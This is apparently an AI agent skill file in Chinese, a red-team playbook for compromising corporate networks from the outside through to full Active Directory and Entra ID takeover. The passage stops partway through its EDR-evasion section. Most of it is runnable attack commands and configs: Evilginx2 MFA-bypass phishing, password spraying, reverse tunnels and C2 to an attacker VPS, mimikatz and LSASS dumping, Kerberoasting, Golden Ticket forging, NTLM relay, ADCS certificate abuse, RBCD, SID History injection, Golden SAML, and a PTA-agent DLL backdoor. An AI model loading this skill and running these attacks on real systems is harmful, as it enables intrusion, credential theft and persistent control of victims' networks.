---
name: network-penetration-testing
description: 网络渗透测试/红队攻击链深度专业技能（资深攻防专家版 v3.0）：红队攻击链整体规划与MITRE ATT&CK TTP映射、目标建模与决策树、高级外网打点(钓鱼联动/供应链/云资产入口)、隧道代理与C2隐蔽、内网信息收集与BloodHound CE图分析、AD域渗透深化(Kerberoast/DCSync/ADCS ESC1-16/委派滥用/信任关系/混合身份Azure AD)、EDR环境高级横向(LOTL/无文件/内存执行)、权限提升、域控接管与持久化、攻击模拟自动化(Caldera/Atomic Red Team/Sliver)、AI大模型辅助红队作战(路径规划/自动化编排/报告生成)、红队报告与复盘方法论，从信息收集到全域接管完整攻击链
metadata:
  version: 3.0.0
---

# 网络渗透测试深度技能（红队攻击链版）

> **AI LOAD INSTRUCTION**: 红队网络渗透全流程专家打法。聚焦攻击链规划与 TTP 映射→外网打点→隧道→内网横向→EDR 对抗→域控接管的阶段决策；细分漏洞面交给对应细分 skill，报告对齐 pentest-output-standards。

## 概述

网络渗透与红队对抗是攻防演练的核心战场。本技能站在**资深攻防专家/红队队长视角**，系统化覆盖**红队攻击链整体规划→高级外网打点→隧道代理→内网信息收集→AD域渗透→权限提升→域控接管→持久化→报告复盘**完整攻击链，并融入 2025-2026 年最新攻击技术情报（ADCS ESC1-ESC16 全谱、Certighost CVE-2026-54121、NTLM Reflection 新原语 CVE-2025-33073、BloodHound CE v8 OpenGraph、混合身份 Golden SAML、AI 自主渗透平台等）。

与 `intranet-penetration-testing` 技能（内网阶段高频实操细节：本地信息收集、凭证窃取、隐藏隧道、提权矩阵、免杀C2）**互补定位**：本技能负责**全局攻击链规划、高级对抗维度与攻防方法论**（TTP 映射、目标建模、高级打点、EDR 横向、AD 高级攻击、攻击模拟自动化、AI 结合、报告复盘）；内网实操的"颗粒度细节"见 `intranet-penetration-testing`，两技能配合可覆盖从外网资产到域控接管的完整闭环。

### 核心概念
- **攻击链（Kill Chain）**：侦察→打点→立足→隧道→横向→提权→域控→持久化，非线性、可迭代的网状过程
- **Tier 0 资产**：域控、ADFS、Entra Connect、CA（证书服务器）、备份系统等"控制一切"的资产，是红队最高优先级目标
- **Assume Breach**：以"已被攻破"为前提设计攻击路径，内网阶段从"标准域用户被攻破"起步
- **TTP（MITRE ATT&CK）**：战术/技术/过程的标准语言，红队用它规划路径、蓝队用它检测响应
- **OPSEC**：作战安全——减少触警面（低噪音优先被动技术，再主动技术）
- **BloodHound 图论**：把 AD 提权抽象为图遍历问题，路径 = 从"已拥有节点"到"Tier 0 节点"的可达边
- **混合身份（Hybrid Identity）**：本地 AD 与 Azure AD/Entra ID 通过 Entra Connect/ADFS 联动，信任继承使"本地域管=云端主钥匙"

## 一、红队攻击链整体规划与 TTP 映射

### 1.1 完整攻击链总览

```
Phase 0  目标建模与情报准备     → 资产梳理、Tier 0 识别、决策树
Phase 1  高级外网打点           → Web/VPN/邮件/钓鱼联动/供应链/云资产
Phase 2  隧道代理与 C2          → SOCKS5/HTTP/DNS/ICMP 隧道、流量隐蔽
Phase 3  内网信息收集           → 存活/端口/服务/AD 枚举/BloodHound 图分析
Phase 4  凭据获取               → Kerberoast/AS-REP/内存提取/DCSync/网络抓取
Phase 5  横向移动               → PTH/PTT/WMI/WinRM/DCOM/SMB/EDR 对抗
Phase 6  权限提升               → 本地提权/域内提权/ADCS/ACL 滥用
Phase 7  域控接管               → DCSync → 黄金票据/白银票据/证书伪造
Phase 8  持久化                 → ACL 后门/DCShadow/黄金证书/混合身份后门
Phase 9  报告复盘               → 攻击链复现/证据链/TTP 映射/检测规则输出
```

### 1.2 目标建模与攻击路径决策树

**资产价值分级（决定攻击优先级）：**
| 等级 | 资产类型 | 攻击价值 |
|------|---------|---------|
| Tier 0 | 域控、ADFS、Entra Connect、CA、备份、密码管理器 | 拿到即全域接管 |
| Tier 1 | 域管理员/服务器管理员账户、特权工作站 | 通向 Tier 0 的桥 |
| Tier 2 | 服务器、数据库、应用管理员 | 扩大横向面 |
| 低值 | 普通工作站、普通用户 | 攻击链起点/跳板 |

**决策树（拿到一个立足点后）：**
```
立足点 → 本地管理员？ ──否──→ 本地提权（内核/服务/Token）
        └──是──→ 能访问域控？ ──否──→ 域枚举 → BloodHound 找路径
                          └──是──→ DCSync 一步到位
内网可达 ADCS？ ──是──→ Certipy 审计 ESC1-ESC16
内网可达 ADFS/Entra Connect？ ──是──→ 证书提取/Golden SAML/同步账户滥用
域间有信任？ ──是──→ 信任攻击（SID History/跨域枚举）
```

### 1.3 MITRE ATT&CK TTP 映射表

| 攻击阶段 | 战术（Tactic） | 代表性技术（Technique） |
|---------|--------------|------------------------|
| 情报收集 | TA0043 侦察 | T1595 主动扫描 / T1596 公开数据 |
| 外网打点 | TA0001 初始访问 | T1190 利用暴露应用 / T1566 钓鱼 |
| 隧道 C2 | TA0011 命令与控制 | T1572 协议隧道 / T1090 代理 |
| 内网收集 | TA0007 发现 | T1018 远程系统发现 / T1087 账户发现 |
| 凭据获取 | TA0006 凭证访问 | T1558.003 Kerberoast / T1003.006 DCSync |
| 横向移动 | TA0008 横向移动 | T1021.001 SMB-WinRM / T1550.002 PTH |
| 权限提升 | TA0004 权限提升 | T1134 Token 操纵 / 域内提权 |
| 持久化 | TA0003 持久化 | T1098 账户操作 / T1556.001 Skeleton Key |
| 防御绕过 | TA0005 防御绕过 | T1055 进程注入 / T1036 伪装 |

> **实战价值**：用 ATT&CK 编号写报告（如 `T1558.003 Kerberoasting`），蓝队可直接对照检测规则；红队可据此设计"低检测覆盖面"路径。

### 1.4 红队战役设计要素
- **RoE（交战规则）**：明确授权范围、禁打资产、允许时间窗口、破坏性操作边界、应急止损联系人
- **场景定义**：从外部攻破 / 从内部模拟 / 双场景混合；是否模拟特定 APT 的 TTP
- **OPSEC 基线**：操作者日志留痕、禁用未授权动作、每次横向后自查触警情况
- **时间管理**：侦察与利用分离、高峰时段通信降低检测概率、关键动作前做影响评估

### 1.5 与 intranet-penetration-testing 技能的分工
- 本技能：**端到端攻击链规划 + 高级维度**（本文件）
- `intranet-penetration-testing`：内网阶段**实操颗粒度**（本地信息收集命令矩阵、mimikatz 细节、隐藏隧道搭建、提权矩阵、免杀 C2、内网 AI 资产攻击面 Ollama/vLLM/RAG/MCP）
- 建议用法：攻防演练中"全局规划"参照本技能，"进入内网后的每一步操作细节"参照 intranet 技能，本章 3.2/五~九 与 intranet 章节互见

## 二、高级外网打点

### 2.1 攻击面测绘（四层法）

```
Layer 1: 域名/IP资产
  subfinder -d corp.com -all -o subs.txt
  amass enum -passive -d corp.com
  masscan -p1-65535 --rate 10000 -iL ip.txt -oL ports.txt
  nmap -sV -sC -p $(cat ports.txt | tr ',' ' ') -iL ip.txt -oA scan

Layer 2: 证书透明日志（找隐藏子域/入口）
  curl -s "https://crt.sh/?q=%25.corp.com&output=json" | jq -r '.[].name_value' | sort -u
  # owa/adfs/mail/webmail/vpn/rdweb/citrix/sslvpn 等关键词优先

Layer 3: 互联网测绘（Shodan/Censys/Fofa）
  shodan search "ssl.cert.subject.cn:corp.com" --fields ip_str,port,org
  shodan search "http.title:login country:CN org:'corp'" 
  # 找暴露的 OWA/ADFS/Exchange/VPN/RDP/数据库

Layer 4: 组织情报（钓鱼准备+口令猜测语料）
  theHarvester -d corp.com -b all
  # Hunter.io/snov.io：企业邮箱格式 (名.姓@corp.com)
  # 招聘网站：技术栈推断（Java/PHP/.NET → 对应漏洞面）
  # dehashed/haveibeenpwned：历史泄露凭据（拼凑弱口令字典）
```

### 2.2 常见外网入口利用深化

| 入口 | 攻击向量 | 要点 |
|------|---------|------|
| Web 应用 | SQLi/RCE/SSRF/文件上传/反序列化 | 参考 `sql-injection-testing`/`fastjson-exploitation` 等专项技能 |
| VPN（SSL VPN/Fortinet/Pulse） | 历史 RCE、默认口令、会话固定 | 关注厂商 CVE 公告，2024-2026 多家 VPN 出过高危 RCE |
| 邮件系统 OWA/ECP | 口令喷洒、Exchange RCE 链 | **喷洒注意锁定策略**，慢速低并发 |
| ADFS/RDWeb | 口令喷洒、ADFS 配置滥用 | `/adfs/ls/idpinitiatedsignon` 页面常被遗忘暴露 |
| RDP/VNC/SSH | 弱口令、协议漏洞 | Hydra 慢速爆破，配合 Honeypot 感知 |
| 远程运维软件 | 向日葵/Todesk/AnyDesk | 默认密码、设备码爆破、历史漏洞 |
| 云资产 | OSS 桶/S3 未授权、云凭证泄露、托管控制台 | 见 2.4 节 |

**口令喷洒模板（低噪音）：**
```bash
# 单用户单密码慢速轮询，避免锁定
crackmapexec smb vpn.corp.com -u users.txt -p 'Corp@2026!' --continue-on-success
# OWA 喷洒（模块化）
ruler --domain corp.com brute --users users.txt --passwords pass.txt --delay 30
```

### 2.3 钓鱼联动（红队标准入口）

```
准备阶段: 仿冒域名+SSL 证书（Typosquatting）、邮箱伪造 SPF/DKIM 检查
投递阶段: GoPhish 批量投递 / 宏文档 / OneNote / ISO 附件 / 恶意 LNK（注意 CVE-2026-32202 类 LNK 触发面）
捕获阶段: Evilginx2 中间人（MFA 绕过，代理真实登录流程）
联动阶段: 捕获的凭据/会话 → 直接作为内网阶段起点（Assume Breach）
```
```bash
# Evilginx2 反代仿冒登录页（捕获 OTP/会话 Cookie）
# config: phishlet 定义仿冒站点, lures 生成钓鱼链接
evilginx2 -p phishlets/ -c config.yaml
```
> **关键**：钓鱼捕获的**会话 Cookie/Token**（而非仅密码）是进入内网的最强钥匙；捕获的邮箱可继续作为**内网横向的信息源**（读邮件找 VPN 账号、资产清单、密码重置流程）。

### 2.4 供应链与云资产入口
- **供应链**：目标供应商/外包商泄露源码（GitHub 搜索 `corp.com` 关键代码/密钥）、第三方组件仓库投毒（npm/PyPI 依赖混淆）、外包系统成为跳板
- **云资产**：
  ```bash
  # 云存储桶枚举（OSS/S3 未授权读写 → WebShell/泄露文件）
  cloud_enum -k corp.com --disable-aws
  # 云凭证泄露（Github 搜索）
  trufflehog github --org=corp --only-verified
  # 托管数据库/Redis/ES 未授权（云上常见）
  ```
- **GitHub 泄露扫描**：`gitdorker`/`trufflehog` 找 `corp` 相关仓库中的 API Key、`corp.com` 内部域名、`.env`、VPN 配置
- **历史漏洞利用思路**：OA/ERP/门户系统（泛微/致远/用友/蓝凌等）历史 RCE 批量检测，与 `spring-exploitation`/`shiro-exploitation`/`log4shell-exploitation` 专项技能联动

### 2.5 打点后的第一滴血（Foothold Checklist）
```bash
# 1. 回连验证（确认出网能力与方向）
curl -x http://127.0.0.1:8080 http://attacker:8000/ping  # 经代理验证
# 2. 权限基线（whoami/systeminfo/网络位置）
whoami; systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig /all; route print; arp -a
# 3. 判断是否入域（决定后续走域渗透 or 本机深耕）
echo %USERDOMAIN% | findstr /V %COMPUTERNAME%
# 4. 落地隧道（参考第三章）建立持久可控通道
# 5. 同步触发 intranet-penetration-testing 技能的本地信息收集清单
```

## 三、隧道与代理

### 3.1 隧道技术矩阵

| 技术 | 工具 | 场景 | 检测难度 |
|------|------|------|---------|
| SOCKS5 代理 | frp/Chisel/rpivot/ligolo-ng | 通用 TCP 代理 | 中 |
| HTTP 代理 | Neo-reGeorg/Tunna/regressh | WebShell 代理 | 中 |
| ICMP 隧道 | ptunnel/icmpsh | 严格防火墙 | 低（少见） |
| DNS 隧道 | dnscat2/iodine | 仅 DNS 出口 | 低（特征明显） |
| SSH 隧道 | ssh -D/-L/-R | 有 SSH 访问 | 中 |
| 多级代理 | frpc→frps→proxychains | 多层内网 | 中 |
| WebSocket | Chisel over WSS | WAF 穿透 | 低 |
| HTTP/3、QUIC | quic 隧道 | 高级出口过滤 | 低 |
| C2 自带隧道 | Cobalt Strike/Sliver pivot | 与 C2 一体化 | 中 |

### 3.2 隧道搭建流程（frp / Chisel / SSH）

```bash
# frp（稳定高效）
# 服务端 frps.ini
[common]
bind_port = 7000
token = password
# 客户端 frpc.ini
[common]
server_addr = vps_ip
server_port = 7000
token = password
[socks5]
type = tcp
remote_port = 6000
plugin = socks5

# Chisel（单二进制，轻量，推荐内网）
# 服务端（VPS）
chisel server --port 8080 --reverse
# 客户端（内网靶机）
chisel client vps:8080 R:socks
# 可加 --fingerprint 双向校验防止中间人

# SSH 动态转发
ssh -D 1080 -N -f user@target       # 本地 SOCKS5
ssh -R 7000:127.0.0.1:7000 user@vps # 反向隧道（出网受限时）

# proxychains 使用
# /etc/proxychains4.conf
socks5 127.0.0.1 6000
proxychains nmap -sT -Pn 10.0.0.0/24
```

### 3.3 高级隧道与防火墙穿透
```
- 端口复用：利用已开放的 80/443 端口做隧道（frp tcp_mux / http_proxy 插件）
- 协议封装：SOCKS 封装在 HTTP/WebSocket/DNS/ICMP 中
- 域前置（Domain Fronting）：利用 CDN 白名单域名隐藏 C2 真实目标
- CDN/云函数反代：C2 流量经云函数/CDN 转发，隐藏 VPS 真实 IP
- 时间策略：业务高峰时段通信，流量隐藏在大量正常请求中
- 流量伪装：TLS 指纹（JA3）伪装成 Chrome/Edge、Header 注入噪声（参考 intranet 技能 C2 章节）
```

### 3.4 代理链与路由规划
```bash
# 多级代理：A(打点机) → B(跳板) → C(目标网段)
# 每一级分别起 frp/chisel socks，proxychains 指向上一级
# 动态路由建议
proxychains4 -q nmap -sT -Pn -p 445,3389,5985 --top-ports 20 172.16.0.0/24
# 按网段分批扫描避免全量 ICMP 惊动 IDS
```

### 3.5 隧道 OPSEC
- 隧道进程改名/伪装成系统服务（`--service` 安装、进程注入白名单进程）
- 加密所有隧道流量（TLS/SSH），避免明文 SOCKS 被蓝队抓包分析
- 单一隧道端口绑定固定源 IP，必要时做限速（避免大流量扫描特征）
- 关键跳板机保持"原生状态"，工具用后即删（内存加载优先）

## 四、内网信息收集

### 4.1 内网探测（经代理）

```bash
# 存活主机发现（分段，先高频端口后全量）
proxychains nmap -sn 10.0.0.0/24
proxychains nmap -sT -Pn -p 22,80,443,445,88,389,636,1433,3306,3389,6379,5985 10.0.0.0/24
# RustScan 快速全端口 + 定向 nmap 服务识别
rustscan -a 10.0.0.0/24 -b 2000 -- -sV

# 服务识别
proxychains nmap -sT -Pn -sV -p 88,389,445,636 10.0.0.1
# 域控识别特征：88(Kerberos)+389(LDAP)+636(LDAPS)+3268(GC) 同时开放
# 发现域控后先做"域内账号可控性"测试，而非直接爆破
```

### 4.2 内网关键服务攻击面

| 端口 | 服务 | 攻击方向 |
|------|------|---------|
| 88 | Kerberos | 票据攻击/ASREPRoast/Kerberoast |
| 389/636 | LDAP/LDAPS | 域信息枚举/LDAP 注入 |
| 445 | SMB | SMB Relay/共享枚举/永恒之蓝类 |
| 135 | RPC | DCOM/端口映射/认证胁迫 |
| 5985/5986 | WinRM | PowerShell Remoting |
| 3389 | RDP | 弱口令/RDP 劫持 |
| 1433 | MSSQL | xp_cmdshell/链接服务器/代理凭据 |
| 3306 | MySQL | 弱口令/提权 UDF |
| 6379 | Redis | 未授权/主从复制 RCE |
| 27017 | MongoDB | 未授权访问 |
| 8443 | K8s API | 未授权/K8s 渗透 |
| 8006 | Proxmox/虚拟化 | 管理面接管 |
| 21/22/873 | FTP/SSH/rsync | 弱口令/匿名/镜像泄露 |

### 4.3 BloodHound 图分析与攻击路径（CE v8）

**部署与采集：**
```bash
# BloodHound CE v8（SpecterOps，2025 年后 Legacy 弃用，Kali 2025.3+ 自带）
docker compose up -d                              # 官方 docker-compose 方式
# 域内 Windows 主机上运行采集器
SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp\
# Linux 端采集（可选）
bloodhound-python -u user -p pass -d corp.local -ns 10.0.0.1 --zip

# 导入 zip/json 后内置查询
# - Shortest Paths to Domain Admins from Owned Principals
# - Find Principals with DCSync Rights
# - Find Computers where Domain Users are Local Admin
# - Find All Paths from Kerberoastable Users
```

**核心 Cypher 查询（红队常用）：**
```cypher
// 从已拥有用户到域管的最短路径
MATCH p=shortestPath((n)-[r*1..]->(m:Group))
WHERE n.name =~ 'USER.*' AND m.name =~ 'DOMAIN ADMINS.*' RETURN p
// 拥有 DCSync 权限的主体
MATCH p=(m)-[:GenericAll|WriteDacl|WriteOwner*1..]->(dc:Domain)
WHERE dc.objectid =~ 'S-1-5-21.*' AND NOT m.objectid =~ 'S-1-5-21.*-512' RETURN p
// 可达非约束委派主机
MATCH p=(n)-[r:AdminTo|GenericAll*1..]->(c:Computer)
WHERE c.unconstraineddelegation = true RETURN p
// 高价值 ACL 滥用点（GenericWrite/GenericAll 于特权组）
MATCH p=(n)-[:GenericWrite|GenericAll|WriteDacl|WriteOwner]->(g:Group)
WHERE g.name =~ 'DOMAIN ADMINS.*|ENTERPRISE.*' RETURN p
```

**图分析实战心法：**
```
- 标记 owned 节点后重新计算路径 → 每次新凭据都刷新分析
- 路径优先级：ADCS > 委派 > ACL > 常规成员关系（ADCS 路径往往一步到域管）
- 优先验证"低成本高收益"路径：可离线破解（Kerberoast）> 需要触发认证（Coercion+Relay）> 需要写 ACL
- BloodHound CE v8 OpenGraph：可扩展到 GitHub/Jamf/Okta/Snowflake，混合身份路径需重点关注（见 6.6）
```

## 五、AD 域渗透基础攻击

### 5.1 Kerberos 攻击详解

```bash
# AS-REP Roasting（无需密码的账户，T1558.004）
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes wordlist.txt

# Kerberoasting（SPN 关联账户，T1558.003——2026 年最高频技术）
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1 -outputfile spn.hashes
# 或用 Rubeus（域内主机）
Rubeus.exe kerberoast /outfile:spn.hashes
hashcat -m 13100 spn.hashes wordlist.txt

# 黄金票据（需要 krbtgt Hash，T1558.001）
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc.corp.local

# 白银票据（需要目标服务 Hash，T1558.002）
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-xxx -domain corp.local -spn cifs/dc.corp.local user
# 白银票据只伪造单个服务（如 cifs/spn/ldap），隐蔽性更好

# 委派攻击（非约束/约束/RBCD，T1558.002 变体）见 6.2
```

> **检测提示（防御视角）**：Kerberoasting 最高信号是 Event ID 4769 携带 RC4 加密类型(0x17)；AS-REP Roasting 对应 4768。红队可在报告阶段据此输出检测建议。

### 5.2 NTLM 攻击与投毒

```bash
# LLMNR/NBT-NS/mDNS 投毒（Responder）
responder -I eth0 -dwPv
# IPv6 投毒（mitm6，DNSSEC 环境绕过 LLMNR 关闭场景）
mitm6 -d corp.local
# Inveigh（PowerShell 版，无文件落地）
Invoke-Inveigh -NBNS Y -LLMNR Y -HTTP Y -SMB Y

# SMB Relay（投毒捕获的认证转发到目标，T1557）
# 前提：目标关闭 SMB 签名，且捕获账户具备高权限
ntlmrelayx.py -t smb://10.0.0.5 -smb2support -i    # 交互式 shell
ntlmrelayx.py -t ldap://10.0.0.1 --delegate-access  # 配置 RBCD 后门
# 经典组合：Responder 关 SMB/HTTP + ntlmrelayx
```

### 5.3 凭证访问与内存提取

```bash
# mimikatz（域内主机，T1003.001/002）
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv  # 全量（最后一步）
# pypykatz（Linux 端离线解析 LSASS dump）
pypykatz lsa minidump lsass.dmp

# 免杀取 LSASS（EDR 环境替代 mimikatz 进程内操作，详见第七章）
procdump64.exe -ma lsass.exe lsass.dmp     # 利用签名工具（T1003.001 变体）
# Rubeus dump（票据导出用于 PTT）
Rubeus.exe dump /luid:0x3e7 /service:krbtgt
```

### 5.4 横向移动基础（详见第七章 EDR 对抗深化）

```bash
# PTH（Pass The Hash，T1550.002）
proxychains impacket-psexec -hashes :NT_HASH corp.local/user@10.0.0.5
crackmapexec smb 10.0.0.0/24 -u user -H NT_HASH --exec-method smbexec

# PTT（Pass The Ticket，T1550.003）
export KRB5CCNAME=/tmp/ticket.ccache
proxychains impacket-wmiexec -k -no-pass corp.local/user@10.0.0.5

# WMI / WinRM / DCOM / SCP
proxychains impacket-wmiexec corp.local/user:pass@10.0.0.5
proxychains evil-winrm -i 10.0.0.5 -u user -H NT_HASH
proxychains impacket-dcomexec -hashes :NT_HASH corp.local/user@10.0.0.5

# 批量横向（crackmapexec/netexec）
crackmapexec smb 10.0.0.0/24 -u user -H hash --exec-method wmiexec -x 'whoami'
```

## 六、AD 高级攻击深化

### 6.1 ADCS 证书服务攻击全谱（ESC1-ESC16）

ADCS 是 2024-2026 年**最高产的域提权面**：83% 的 AD 渗透在数小时到 Domain Admin，ADCS 路径常常一步到位且绕过口令爆破。

```bash
# Certipy 5.1.0（支持 ESC1-ESC16 全谱检测与利用）
certipy find -u user@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable -stdout
# 常见漏洞模板：
# ESC1: 客户端认证 + 请求者可指定 SAN
# ESC2: Any Purpose 模板（可伪造任意用途证书）
# ESC3: 代理注册 + 注册代理模板组合
# ESC4: 低权限可写模板 ACL → 改模板再利用 ESC1
# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 标志开启
# ESC8: NTLM Relay 到 CA 的 HTTP 注册端点（certfnsh.asp）
# ESC9/ESC10: 强认证与 NTAuth 相关（需配合客户端认证绕过）
# ESC13: 模板中嵌入 CA 证书模板可指定组（组内用户可申请）
# ESC14: 证书映射攻击（同名 SAN 映射）
# ESC15: 弱加密签名等
# ESC16: 新的证书映射绕过面

# ESC1 利用（以域管身份申请证书）
certipy req -u user@corp.local -p pass -target 10.0.0.1 -ca 'CORP-CA' \
  -template 'VulnTemplate' -upn 'administrator@corp.local' -out admin.pfx
# 用证书做 PKINIT 认证（无需域管密码）
certipy auth -pfx admin.pfx -dc-ip 10.0.0.1 -domain corp.local
# 输出 NTLM hash 后 PTH → DCSync

# ESC8：NTLM Relay 到 ADCS HTTP 注册端点（配合 Coercer 触发 DC 认证）
ntlmrelayx.py -t http://10.0.0.1/certsrv/certfnsh.asp -smb2support --adcs \
  --template 'DomainController'
coercer coerce -u user -p pass -t 10.0.0.1 -l 10.0.0.50   # 胁迫 DC 向攻击机认证
```

**Certighost（CVE-2026-54121）——2026-07 新增 ADCS 高危**：
- 类型：ADCS enrollment chase 回退缺陷，**与模板配置无关**（默认 `Machine` 模板 + 企业 CA 即可）
- 影响：低权限域用户诱导 CA 为**任意域控制器**签发身份证书 → PKINIT 冒充 DC → DCSync → Golden Ticket 全域接管
- CVSS 8.8，微软 2026-07-14 补丁，2026-07-24 公开 PoC（GitHub: aniqfakhrul/CVE-2026-54121）
- 意义：打破"模板合规即安全"的防御思维定式；**审计 CA 需同时检查补丁状态与历史证书请求中的 chase 属性**

### 6.2 委派滥用（非约束/约束/RBCD）

```bash
# 非约束委派（Unconstrained Delegation）——持有用户的 TGT 可长期窃用
# 发现：BloodHound 查 unconstraineddelegation 或
ldapsearch -x -H ldap://10.0.0.1 -b "DC=corp,DC=local" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName
# 利用：Rubeus monitor 等待高权限用户访问 → 抓取 TGT（诱骗访问：SpoolSample/PetitPotam 胁迫 DC 认证到委派主机）
Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe 10.0.0.1 <delegation-host>   # 胁迫 DC 向委派主机认证

# 约束委派（Constrained Delegation）——可伪造指定服务的 TGS
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator \
  /msdsspn:cifs/dc.corp.local /ptt

# 基于资源的约束委派（RBCD，T1558.002 变体）——控制目标机器账户即可
# 前提：对目标计算机有 GenericWrite 或已控机器账户
impacket-addcomputer corp.local/user:pass -computer-name 'evil$' \
  -computer-pass 'EvilPass123' -dc-ip 10.0.0.1
impacket-rbcd -delegate-to 'dc.corp.local' -delegate-from 'evil$' \
  corp.local/user:pass -action write -dc-ip 10.0.0.1
Rubeus.exe s4u /user:evil$ /rc4:HASH /impersonateuser:administrator /msdsspn:host/dc.corp.local /ptt
impacket-psexec -k -no-pass corp.local/administrator@dc.corp.local
```

### 6.3 信任关系攻击

```bash
# 域/林信任枚举
nltest /domain_trusts /all_trusts
impacket-getTGT corp.local/user:pass -dc-ip 10.0.0.1
# 跨域/跨林横向（用当前域 TGT 访问对方域资源）
impacket-psexec -k -no-pass corp.local/user@dc.child.corp.local
# SID History 注入（跨域提权，需域管权限）
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-xxx \
           /sids:S-1-5-21-yyy-512 /krbtgt:HASH /ptt   # 注入对方域 Domain Admins SID
# 利用信任：子域域管（非企业域管）通过 SID History 提权到父域
# 林间信任 + 认证服务路径（CVE-2022-33679、SID History 变体等）持续跟进
```

### 6.4 ACL 滥用（BloodHound 定位的精细化攻击）

| ACL 权限 | 滥用效果 | 工具 |
|---------|---------|------|
| GenericAll/GenericWrite（对象） | 重置密码/添加 SPN/写属性 | PowerView/impacket |
| WriteDACL/WriteOwner | 改写对象 ACL → 自我授权 | BloodyAD |
| ForceChangePassword | 直接改目标密码 | PowerView `Set-DomainUserPassword` |
| AddMember（组） | 把自己加入特权组 | PowerView `Add-DomainGroupMember` |
| GenericWrite（计算机） | 配置 RBCD 后门 | 见 6.2 |

```powershell
# PowerView 重置目标密码（GenericAll on user）
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
# BloodyAD（Linux 端 ACL 滥用，无需域内主机）
bloodyAD --host 10.0.0.1 -d corp.local -u user -p pass add genericAll target_user
bloodyAD --host 10.0.0.1 -d corp.local -u user -p pass set password target_user NewPass123!
```

### 6.5 认证胁迫与 NTLM Relay 新原语（2025-2026 情报）

**认证胁迫（Coercion）——让高权限主机主动向攻击机认证：**
```bash
# PetitPotam / PrinterBug / DFSCoerce / Coercer（统一化框架）
coercer coerce -u user -p pass -t 10.0.0.1 -l 10.0.0.50 --listener 10.0.0.50
```

**2025-2026 NTLM 攻击演进（重要更新）：**
- **CVE-2025-33073（NTLM Reflection）**：反射攻击绕过 SMB 签名限制的新原语，2026 年研究持续产出新利用面；2026-01 Depth Security 的 Impacket fork 剥离 NTLMSSP SIGN/SEAL 标志同时保留 MIC，把 Reflection 扩展到 **LDAP/LDAPS** 及部分 RPC（任务计划器）
- **CVE-2025-24054**：`.library-ms` 恶意文件夹触发 NTLM Hash 泄露，已入 CISA KEV（2025-03）
- **CVE-2025-54918**：胁迫+中继组合，篡改 NTLM 消息字段绕过 LDAP 签名与通道绑定
- **CVE-2026-32202**：LNK 文件零点击认证胁迫（APT28 零日的不完整补丁，Akamai 2026-04 披露）
- **微软 NTLM 淘汰时间线**：2026-10 自动阻断 NTLMv1 SSO；NTLMv2 仅标记 deprecated——**红队需将 NTLM 利用视为"时效窗口"，同时把 Kerberos 与证书攻击作为主路径**

### 6.6 混合身份攻击（本地 AD ↔ Azure AD/Entra ID）

混合身份是 2025-2026 年 APT 从本地打到云的**主路径**（约 65% 初始访问是身份驱动而非恶意软件驱动）：

```
Stage 1  打点本地：Kerberoast/NTLM Relay/ADFS 代理 → 拿到 ADFS 服务账户或域管
Stage 2  提取签名密钥：ADFSDump（提取加密 PFX）+ DKM 密钥（AD 中解密）
Stage 3  伪造令牌：ADFSpoof / shimit 离线伪造任意用户的 SAML 断言（Golden SAML）
Stage 4  云端行动：加联邦域/OAuth 应用授权/后门 Service Principal/Graph API 窃取
```

**Entra Connect 同步攻击（高价值单点）：**
```powershell
# AADInternals 套件
Install-Module AADInternals
Get-AADIntTenantID -Domain corp.com            # tenant 侦察（无需凭据）
# 渗透 Entra Connect 服务器（通常 Domain Admin 权限）→
Get-ADIntPassword  msDS-ManagedPassword         # 提取同步账户(MSOL_)明文密码
# 用 MSOL_ 账户做云端 DCSync 式操作 / 重置云端用户密码（2025-09 微软披露真实攻击：非人类同步身份+全局管理员无 MFA → 重置密码→同步回云端）
# PTA Agent 后门：注入 DLL Hook LogonUserW（PTASpy）→ 记录全部云端登录口令
# Seamless SSO 漂移：改 azureADSSO 账户密码 → 云端登录降级
```

**其他混合身份面：**
- **Golden SAML**（T1606.002）：拿 ADFS token-signing 私钥 → 伪造任意用户 SAML → 绕过密码/MFA，密码重置无效
- **Silver SAML**：伪造特定服务（如 O365）的 SAML
- **OAuth 应用授权滥用**：诱管理员授权恶意应用 → 用应用权限读邮箱/Graph
- **Storm-0558 教训**：IdP 私钥泄露 → 任意 token 伪造；红队报告应提醒云侧签名密钥的防护
- **云侧横向**：本地域管 → Entra Connect → 云端全局管理员（Azure MFA 强制 Phase 2 2025-10 后注意服务主体/工作负载身份不受影响，仍是攻击面）

## 七、EDR 环境下的高级横向移动

### 7.1 EDR 检测机制认知（对抗前提）

```
现代 EDR：行为分析 + 内核遥测（ETW）+ 用户态 hook + AI 模型，不止签名
关键被监测点：进程创建(4688/AMSI)、LSASS 访问、内存注入、PowerShell 脚本块、
  WMI/计划任务远程执行、新服务、网络外联特征、命令行参数特征
```
> 数据点：CrowdStrike 2024 年 79% 检出是 malware-free（合法凭据 + LOTL + RMM 工具），Bitdefender 分析 84% 高危攻击使用 Living off the Land——**EDR 环境下"无文件/无恶意软件横向"是主流**。

### 7.2 LOTL 无文件横向（不落盘、不加载恶意二进制）

```bash
# 1. PowerShell Remoting（WinRM，域内默认开启）
$cred = New-Object PSCredential('user',(ConvertTo-SecureString 'pass' -AsPlainText -Force))
Invoke-Command -ComputerName 10.0.0.5 -Credential $cred -ScriptBlock { whoami; ipconfig }
